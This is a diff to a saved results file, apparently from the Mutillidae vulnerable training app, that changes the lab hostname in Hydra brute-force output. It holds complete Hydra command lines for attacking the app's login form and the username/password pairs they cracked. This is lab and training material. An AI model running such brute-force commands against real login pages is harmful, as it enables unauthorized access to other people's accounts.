@@ -103,13 +103,13 @@
 [80][http-post-form] host: 127.0.0.1   login: scotty   password: password
 [80][http-post-form] host: 127.0.0.1   login: simba   password: password
 # Hydra v9.0 run at 2020-04-30 18:43:55 on 127.0.0.1 http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
-# Hydra v9.0 run at 2020-04-30 18:44:31 on mutillidae.local http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt mutillidae.local http-post-form /index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
-[80][http-post-form] host: mutillidae.local   login: bobby   password: password
-[80][http-post-form] host: mutillidae.local   login: bryce   password: password
-[80][http-post-form] host: mutillidae.local   login: cal   password: password
-[80][http-post-form] host: mutillidae.local   login: dreveil   password: password
-[80][http-post-form] host: mutillidae.local   login: jeremy   password: password
-[80][http-post-form] host: mutillidae.local   login: jim   password: password
-[80][http-post-form] host: mutillidae.local   login: john   password: password
-[80][http-post-form] host: mutillidae.local   login: scotty   password: password
-[80][http-post-form] host: mutillidae.local   login: simba   password: password
+# Hydra v9.0 run at 2020-04-30 18:44:31 on mutillidae.localhost http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt mutillidae.localhost http-post-form /index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: mutillidae.localhost   login: bobby   password: password
+[80][http-post-form] host: mutillidae.localhost   login: bryce   password: password
+[80][http-post-form] host: mutillidae.localhost   login: cal   password: password
+[80][http-post-form] host: mutillidae.localhost   login: dreveil   password: password
+[80][http-post-form] host: mutillidae.localhost   login: jeremy   password: password
+[80][http-post-form] host: mutillidae.localhost   login: jim   password: password
+[80][http-post-form] host: mutillidae.localhost   login: john   password: password
+[80][http-post-form] host: mutillidae.localhost   login: scotty   password: password
+[80][http-post-form] host: mutillidae.localhost   login: simba   password: password
